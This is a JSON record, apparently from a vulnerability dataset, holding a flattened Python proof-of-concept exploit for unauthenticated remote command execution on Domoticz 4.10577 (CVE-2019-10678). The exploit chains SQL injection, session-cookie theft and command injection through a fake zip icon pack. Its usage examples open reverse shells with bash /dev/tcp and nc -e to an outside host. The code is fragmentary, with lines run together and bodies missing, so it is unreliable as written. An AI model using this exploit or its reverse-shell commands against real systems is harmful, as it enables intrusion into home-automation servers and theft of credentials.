{
    "text": "vul_name : Domoticz 4.10577 Unauthenticated Remote Command Execution ， vul_cve : CVE-2019-10678 ， vul_poc :  #  ! /usr/bin/env python ，  # - * - coding : utf-8 - * - ，  # Exploit Title : Unauthenticated Remote Command Execution on Domoticz <= 4.10577 ，  # Date : April 2019 ，  # Exploit Author : Fabio Carretto @ Certimeter Group ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : Domoticz <= 4.10577 ，  # Tested on : Debian 9 ，  # CVE : CVE-2019-10664 , CVE-2019-10678 ，  # Bypass authentication , inject commands and execute them ，  # Required login page or no authentication ( doesn't work with \"Basic-Auth\" setting )  ，  # There are 3 injection modes. The 1st and the 2nd bypass the char filter :  ，  # 1.Default mode insert the commands in a script and reply with it once to ，  # an HTTP request. Set address and port of the attacker host with -H and -P ，  # 2. ( -zipcmd ) a zip icon pack will be uploaded. The domoticz installation path ，  # can be optionally specified with -path /opt/domoti. ，  # 3. ( -direct ) commands executed directly. Characters like & pipe or redirection ，  # cannot be used. The execution may block domoticz web server until the end ，  # Examples :  ，  # ./exploit.py -H 172.17.0.1 -P 2222 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &' ，  # ./exploit.py -zipcmd 'nc 10.0.2.2 4444 -e /bin/bash &' ，  # Retrieve data from db with the SQL Injection on the public route ， sqlinj = sqlpref % field ， urltmp = url_sqlinj + sqlinj ， r = session.get ( urltmp )  ， print ' [ + ] %s : %s' % ( field , r.text )  ，  # Login and return the SID cookie ， url_login_cred = url_login % ( username , password )  ， r = session.get ( url_login_cred )  ， sid = r.headers [ 'Set-Cookie' ]  ， sid = sid [ sid.find ( 'SID=' ) +4 : sid.find ( ' ; ' )  ]  ， print ' [ + ] SID=' + sid ，  # Search an uvc cam. If exists return its json config ， r = session.get ( url_camjson )  ， cams = json.loads ( r.text )  ，  # Prompt the user and ask if continue or not ， print ' [ + ] WARNING : ' + msg ， exit ( 0 )  ，  # Embed the commands in a zip icon file ( -zipcmd )  ， zipname = 'iconpackfake.zip' ， with zipfile.ZipFile ( zipname , 'w' ) as zip :  ， zip.writestr ( 'icons.txt' , \"fakeicon ; Button fakeicon ; fake\" )  ， zip.writestr ( 'fakeicon.png' , commandsline )  ， zip.writestr ( 'fakeicon48_On.png' , commandsline )  ， zip.writestr ( 'fakeicon48_Off.png' , commandsline )  ，  # HTTP server that reply once with the content of the script ， class SingleHandler ( BaseHTTPServer.BaseHTTPRequestHandler )  :  ， respbody = \" ， self.send_response ( 200 ) ",
    "time": "2019.05.01"
}